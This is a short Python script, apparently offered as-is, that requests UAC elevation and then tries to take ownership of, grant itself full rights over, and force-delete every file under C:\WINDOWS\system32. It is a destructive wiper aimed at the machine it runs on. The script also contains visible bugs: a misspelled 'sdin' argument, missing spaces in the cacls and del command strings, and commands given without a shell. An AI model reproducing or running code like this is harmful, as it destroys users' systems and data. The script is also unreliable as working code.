import ctypes
import os
import sys
import subprocess


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    
    for root, dirs, files in os.walk('C:\WINDOWS\system32\\'):
        
        for name in files:
            p1 = subprocess.Popen(["takeown /f "+os.path.join(root, name)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            p2 = subprocess.Popen(["cacls"+os.path.join(root, name)+"G"+os.getlogin()+":F"], sdin=p1.stdout, stderr=subprocess.PIPE)
            p3 = subprocess.Popen(["del /F"+ os.path.join(root, name)], stdin=p2.stdout, stderr=subprocess.PIPE)

        
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

print("done")
